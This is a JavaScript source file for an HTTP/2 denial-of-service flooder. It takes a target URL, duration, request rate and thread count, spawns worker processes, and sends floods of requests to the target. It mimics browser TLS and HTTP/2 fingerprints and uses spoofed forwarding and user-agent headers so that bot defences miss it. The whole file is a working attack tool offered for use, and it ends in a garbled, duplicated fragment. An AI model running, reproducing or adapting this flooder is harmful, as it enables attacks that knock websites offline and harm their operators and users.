const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
    
  function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
  const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
process.on('uncaughtException', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
] 
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 6){console.log(`Usage: node script.js <url> <time> <rate> <threads>`); process.exit();}
 const secureProtocol = "TLS_method";
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target); 
 const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

 if (cluster.isMaster) {
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 5000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
	setInterval(runFlooder,1)
}
  function runFlooder() {
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
};
const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const transformSettings = (settings) => {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": 0x1,
        "SETTINGS_ENABLE_PUSH": 0x2,
        "SETTINGS_MAX_CONCURRENT_STREAMS": 0x3,
        "SETTINGS_INITIAL_WINDOW_SIZE": 0x4,
        "SETTINGS_MAX_FRAME_SIZE": 0x5,
        "SETTINGS_MAX_HEADER_LIST_SIZE": 0x6
    };
    return settings.map(([key, value]) => [settingsMap[key], value]);
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};

const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 },
        duckduckgo: { min: 12, max: 16 }
    };

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Safari";v="${Math.floor(115 + Math.random() * 10)}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "macOS" : "iOS",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X ${Math.random() < 0.5 ? "10_14_6" : "10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 10)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.apple.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 5)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 10)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera";v="${Math.floor(75 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(75 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera GX";v="${Math.floor(80 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(80 + Math.random() * 10)}.0.0.0 GX`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/gx",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": (parsedTarget.path || "/") + "?" + generateRandomString(3,5) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": `Mozilla/5.0 (${Math.random() < 0.5 ? "Windows NT 10.0; Win64; x64" : "Linux; Android 11"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://duckduckgo.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        }
    };

    return headersMap[browser];
};

const browser = getRandomBrowser();
const headers = generateHeaders(browser);
let h2_config;
const h2settings = h2Settings(browser);
h2_config = transformSettings(Object.entries(h2settings));
function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
const randomString = randstr(10);

const headers4 = {
    ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
    ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
};

let allHeaders = Object.assign({}, headers, headers4);

// DIRECT CONNECTION - NO PROXY
const tlsOptions = {
    ALPNProtocols: ["h2", "http/1.1"],
    ciphers: cipper,
    sigalgs: sigalgs,
    ecdhCurve: ecdhCurve,
    secureContext: secureContext,
    honorCipherOrder: false,
    rejectUnauthorized: false,
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    secureOptions: secureOptions,
    host: parsedTarget.host,
    servername: parsedTarget.host,
};

const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

tlsSocket.allowHalfOpen = true;
tlsSocket.setNoDelay(true);
tlsSocket.setKeepAlive(true, 60000);
tlsSocket.setMaxListeners(0);

function generateJA3Fingerprint(socket) {
    const cipherInfo = socket.getCipher();
    const supportedVersions = socket.getProtocol();

    if (!cipherInfo) {
        return null;
    }

    const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;

    const md5Hash = crypto.createHash('md5');
    md5Hash.update(ja3String);

    return md5Hash.digest('hex');
}

tlsSocket.on('connect', () => {
    const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
});
let hpack = new HPACK();
let client;
client = http2.connect(parsedTarget.href, {
    protocol: "https",
    createConnection: () => tlsSocket,
    settings: h2settings,
    socket: tlsSocket,
});

client.setMaxListeners(0);

const updateWindow = Buffer.alloc(4);
updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
client.on('remoteSettings', (settings) => {
    const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
    client.setLocalWindowSize(localWindowSize, 0);
});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const frames = [
    Buffer.from(PREFACE, 'binary'),
    encodeFrame(0, 4, encodeSettings([...h2_config])),
    encodeFrame(0, 8, updateWindow)
];

client.on('connect', async () => {
    const intervalId = setInterval(async () => {
        const shuffleObject = (obj) => {
            const keys = Object.keys(obj);
            for (let i = keys.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [keys[i], keys[j]] = [keys[j], keys[i]];
            }
            const shuffledObj = {};
            keys.forEach(key => shuffledObj[key] = obj[key]);
            return shuffledObj;
        };

        const dynHeaders = shuffleObject({
            ...allHeaders,
            ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} : {}),
            ...(Math.random() < 0.5 ? {["MOMENT" + randstr(4)]: "POLOM" + generateRandomString(1,5) } : {["X-FRAMES" + generateRandomString(1,4)]: "NAVIGATE"+ randstr(3)})
        });

        const packed = Buffer.concat([
            Buffer.from([0x80, 0, 0, 0, 0xFF]),
            hpack.encode(dynHeaders)
        ]);

        const streamId = 1;
        const requests = [];
        let count = 0;

        if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
            for (let i = 0; i < args.Rate; i++) {
                const requestPromise = new Promise((resolve, reject) => {
                    const req = client.request(dynHeaders)
                    .on('response', response => {
                        req.close();
                        req.destroy();
                        resolve();
                    });
                    req.on('end', () => {
                        count++;
                        if (count === args.time * args.Rate) {
                            clearInterval(intervalId);
                            client.close(http2.constants.NGHTTP2_CANCEL);
                        }
                        reject(new Error('Request timed out'));
                    });

                    req.end();
                });

                const frame = encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20);
                requests.push({ requestPromise, frame });
            }

            await Promise.all(requests.map(({ requestPromise }) => requestPromise));
            client.write(Buffer.concat(frames));
        }
    }, 500);  
});

client.on("close", () => {
    client.destroy();
    tlsSocket.destroy();
    return;
});

client.on("error", error => {
    client.destroy();
    tlsSocket.destroy();
    return;
});
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
